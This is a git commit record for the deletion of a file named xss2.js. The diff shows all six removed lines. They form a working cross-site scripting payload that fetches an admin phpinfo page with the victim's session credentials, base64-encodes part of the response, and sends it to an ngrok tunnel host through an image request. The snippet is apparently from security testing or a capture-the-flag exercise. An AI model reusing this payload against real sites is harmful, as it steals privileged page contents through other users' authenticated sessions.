be9fbb98f183cb749b8a595809e3f2a90b65a10c
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-17 21:34:57 +0700

    Delete xss2.js

--- xss2.js
+++
@@ -1,6 +0,0 @@
-fetch('/admin/phpinfo.php', {credentials:'include'})
-.then(r=>r.text())
-.then(d=>{
-    d = d.slice(0,2000);
-    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?d="+encodeURIComponent(btoa(d));
-});
